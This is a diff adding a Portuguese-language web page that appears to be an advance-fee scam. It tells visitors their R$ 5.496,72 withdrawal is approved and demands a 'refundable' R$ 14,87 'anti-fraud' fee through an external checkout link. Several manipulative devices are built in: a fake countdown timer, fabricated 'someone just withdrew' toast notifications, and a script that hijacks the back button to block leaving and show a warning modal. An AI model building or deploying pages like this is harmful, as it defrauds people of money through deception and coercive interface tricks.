@@ -1,0 +1,368 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+    <meta charset="UTF-8">
+     <script src="js/utm-propagator.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Oferta Especial Única</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;700;800&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="css/all.min.css">
+    <link rel="stylesheet" href="css/style-toast.css">
+    <link href="css/boxicons.min.css" rel="stylesheet">
+
+    <style>
+        :root {
+            --primary: #e55146; /* Azul roxeado premium */
+            --primary-hover: #4338CA;
+            --success: #10B981;
+            --danger: #EF4444;
+            --dark: #1F2937;
+            --gray: #F3F4F6;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Inter', sans-serif;
+        }
+
+        body {
+            background-color: #F9FAFB;
+            color: var(--dark);
+            line-height: 1.6;
+            overflow-x: hidden;
+        }
+
+        /* Animações Iniciais */
+        @keyframes slideDown {
+            from { transform: translateY(-100%); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
+
+        @keyframes fadeInUp {
+            from { transform: translateY(20px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
+
+        @keyframes pulseAlert {
+            0% { transform: scale(1); box-shadow: 0 0 0 0 rgba(239, 68, 68, 0.4); }
+            70% { transform: scale(1.02); box-shadow: 0 0 0 10px rgba(239, 68, 68, 0); }
+            100% { transform: scale(1); box-shadow: 0 0 0 0 rgba(239, 68, 68, 0); }
+        }
+
+        @keyframes pulseButton {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.03); }
+            100% { transform: scale(1); }
+        }
+
+        /* Header / Progresso */
+        .progress-bar {
+            background: white;
+            padding: 15px 20px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
+            text-align: center;
+            animation: slideDown 0.5s ease-out;
+        }
+
+        .steps {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 15px;
+            font-size: 14px;
+            font-weight: 600;
+        }
+
+        .step { color: #9CA3AF; }
+        .step.active { color: var(--primary); }
+        .step.done { color: var(--success); }
+
+        /* Container Principal */
+        .container {
+            max-width: 800px;
+            margin: 30px auto;
+            padding: 0 20px;
+            animation: fadeInUp 0.8s ease-out forwards;
+        }
+
+        /* Alerta de Urgência */
+        .alert-box {
+            background: linear-gradient(135deg, var(--danger), #DC2626);
+            color: white;
+            text-align: center;
+            padding: 15px;
+            border-radius: 12px;
+            font-weight: 700;
+            font-size: 18px;
+            margin-bottom: 25px;
+            animation: pulseAlert 2s infinite;
+        }
+
+        /* Cartão de Conteúdo */
+        .card {
+            background: white;
+            border-radius: 20px;
+            padding: 40px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.08);
+            border: 1px solid rgba(0,0,0,0.05);
+        }
+
+        .headline {
+            text-align: center;
+            font-size: 32px;
+            font-weight: 800;
+            margin-bottom: 15px;
+            line-height: 1.2;
+        }
+
+        .headline span { color: var(--primary); }
+
+        .subheadline {
+            text-align: center;
+            color: #4B5563;
+            font-size: 18px;
+            margin-bottom: 30px;
+        }
+
+        /* Benefícios */
+        .benefits {
+            background: var(--gray);
+            border-radius: 12px;
+            padding: 25px;
+            margin-bottom: 30px;
+        }
+
+        .benefit-item {
+            display: flex;
+            align-items: flex-start;
+            gap: 15px;
+            margin-bottom: 15px;
+        }
+        .benefit-item:last-child { margin-bottom: 0; }
+
+        .benefit-icon {
+            color: var(--success);
+            font-size: 20px;
+            margin-top: 2px;
+        }
+
+        /* Preço */
+        .price-box {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .price-old {
+            text-decoration: line-through;
+            color: #9CA3AF;
+            font-size: 18px;
+        }
+
+        .price-new {
+            font-size: 48px;
+            font-weight: 800;
+            color: var(--dark);
+            line-height: 1;
+        }
+
+        /* Botões CTA */
+        .btn-yes {
+            display: block;
+            width: 100%;
+            background: linear-gradient(135deg, var(--success), #059669);
+            color: white;
+            text-align: center;
+            padding: 20px;
+            border-radius: 50px;
+            font-size: 22px;
+            font-weight: 800;
+            text-decoration: none;
+            text-transform: uppercase;
+            box-shadow: 0 10px 25px rgba(16, 185, 129, 0.4);
+            transition: all 0.3s ease;
+            animation: pulseButton 2s infinite;
+            border: none;
+            cursor: pointer;
+        }
+
+        .btn-yes:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 15px 30px rgba(16, 185, 129, 0.5);
+        }
+
+        .btn-no {
+            display: block;
+            width: 100%;
+            text-align: center;
+            margin-top: 20px;
+            color: #6B7280;
+            text-decoration: underline;
+            font-size: 15px;
+            background: none;
+            border: none;
+            cursor: pointer;
+            transition: color 0.3s;
+        }
+
+        .btn-no:hover { color: var(--danger); }
+
+        /* Timer */
+        .timer-container {
+            text-align: center;
+            margin-top: 20px;
+            font-weight: 600;
+            color: #4B5563;
+        }
+
+        .timer {
+            display: inline-flex;
+            gap: 10px;
+            margin-top: 10px;
+        }
+
+        .time-box {
+            background: var(--dark);
+            color: white;
+            padding: 10px 15px;
+            border-radius: 8px;
+            font-size: 20px;
+            font-weight: 700;
+            min-width: 60px;
+        }
+
+        /* Responsivo */
+        @media (max-width: 600px) {
+            .card { padding: 25px; }
+            .headline { font-size: 24px; }
+            .price-new { font-size: 36px; }
+            .btn-yes { font-size: 18px; padding: 15px; }
+        }
+    </style>
+<script
+	src="https://cdn.xtracky.com/scripts/utm-handler.js"
+	data-token="abc60e07-8140-4133-b5df-23c871ba9de6"
+>
+</script>
+</head>
+<body>
+
+    <div class="progress-bar">
+        <div class="steps">
+            <span class="step done"><i class="fas fa-check-circle"></i> Saque Aprovado!</span>
+            <i class="fas fa-chevron-right step active"></i>
+            <span class="step active"><i class="fas fa-spinner fa-spin"></i> Finalizando Pedido</span>
+        </div>
+    </div>
+
+    <div class="container">
+        <div class="alert-box">
+            <i class="fas fa-exclamation-triangle"></i> ESPERE! você é um robô? você pode perder seu saldo
+        </div>
+
+        <div class="card">
+            <h1 class="headline">Agora <span>Falta pouco</span> é necessário que pague uma taxa simbolica para verificar que você é humano</h1>
+            <p class="subheadline">Seu saque foi aprovado</p>
+
+            <div class="benefits">
+                <div class="benefit-item">
+                    <i class="fas fa-check-circle benefit-icon"></i>
+                    <div>
+                        <strong>Porque dessa taxa?</strong>
+                        <p style="font-size: 14px; color: #4B5563;">Estamos enfrentando tentativas de fraude, usuários maliciosos estão tentando usar mecanismos para burlar a nossa verificação e pegar recompensas indevidas.</p>
+                    </div>
+                </div>
+                <div class="benefit-item">
+                    <i class="fas fa-check-circle benefit-icon"></i>
+                    <div>
+                        <strong>Vou ser reembolsaldo?</strong>
+                        <p style="font-size: 14px; color: #4B5563;">Sim, após o pagamento dessa taxa anti-fraude você receberá o valor integral!</p>
+                    </div>
+                </div>
+            </div>
+
+            <div class="price-box">
+               
+                <div class="price-new">R$ 14,87</div>
+                <div style="color: var(--success); font-weight: 700; margin-top: 5px;">(o valor será reembolsado)</div>
+            </div>
+
+            <a href="https://www.pagamentos-seguro.link/checkout/d38f2184-1721-47e7-b466-8e4845382eba" class="btn-yes" style="text-decoration:none;">
+                Pagar taxa e receber R$ 5.496,72
+            </a>
+
+            <div class="timer-container">
+                <p>A verificação expira em :</p>
+                <div class="timer">
+                    <div class="time-box">09<span style="font-size:12px; display:block; font-weight:400">MIN</span></div>
+                    <div class="time-box" id="seconds">59<span style="font-size:12px; display:block; font-weight:400">SEG</span></div>
+                </div>
+            </div>
+
+         
+        </div>
+    </div>
+
+    <script>
+        // Lógica do Timer
+        let time = 599; // 9 minutos e 59 segundos em segundos
+        const timerElement = document.getElementById('seconds');
+        
+        setInterval(() => {
+            if(time <= 0) return;
+            time--;
+            let min = Math.floor(time / 60);
+            let sec = time % 60;
+            
+            // Atualiza os minutos e segundos na tela
+            document.querySelectorAll('.time-box')[0].innerHTML = `${min < 10 ? '0'+min : min}<span style="font-size:12px; display:block; font-weight:400">MIN</span>`;
+            document.querySelectorAll('.time-box')[1].innerHTML = `${sec < 10 ? '0'+sec : sec}<span style="font-size:12px; display:block; font-weight:400">SEG</span>`;
+        }, 1000);
+
+        // Ações dos Botões
+        function aceitarOferta() {
+           window.location.href= 'https://www.pagamentos-seguro.link/checkout/d38f2184-1721-47e7-b466-8e4845382eba'
+        }
+
+       
+    </script>
+    
+     <div id="toast-saque" class="toast-saque">
+      <img id="toast-img" src="https://i.pravatar.cc/150?img=11" alt="Perfil" class="toast-perfil">
+      <div class="toast-texto">
+          <p id="toast-mensagem">Pedro H. sacou  <strong class="texto-verde">R$ 2.029,02</strong></p>
+        
+          <span>há poucos segundos</span>
+      </div>
+      <div class="toast-dot"></div>
+    </div>
+    
+    <script src="js/toast.js"></script>
+
+
+
+<!-- Modal Back Redirect -->
+<div id="overlay-modal" style="display:none;position:fixed;inset:0;background:rgba(0,0,0,0.7);z-index:99999;justify-content:center;align-items:center;">
+  <div style="background:#fff;border-radius:16px;padding:28px 24px;max-width:340px;width:90%;text-align:center;font-family:sans-serif;">
+    <div style="font-size:2rem;margin-bottom:12px;">⚠️</div>
+    <h2 style="font-size:1.2rem;margin-bottom:8px;color:#111;">Tem certeza que quer sair?</h2>
+    <p style="color:#555;font-size:0.9rem;margin-bottom:20px;">Seu saldo será cancelado e você perderá sua recompensa!</p>
+    <button id="btn-finalizar" style="width:100%;padding:14px;background:linear-gradient(135deg,#27ae60,#2ecc71);color:#fff;border:none;border-radius:10px;font-size:1rem;font-weight:700;cursor:pointer;margin-bottom:10px;">✅ Continuar e Resgatar</button>
+    <button id="btn-sair" style="width:100%;padding:12px;background:none;border:none;color:#999;font-size:0.85rem;cursor:pointer;">Sair mesmo assim</button>
+  </div>
+</div>
+<script>
+document.addEventListener("DOMContentLoaded", function () {
+  history.pushState(null, null, location.href);
+  window.addEventListener("popstate", function () {
+    history.pushState(null, null, location.href);
+    document.getElementById("overlay-modal").style.display = "flex";
+  });
+  document.getElementById("btn-finalizar").addEventListener("click", function () {
+    document.getElementById("overlay-modal").style.display = "none";
+  });
+  document.getElementById("btn-sair").addEventListener("click", function () {
+    window.history.back();
+  });
+});
+</script>
+</body></html>
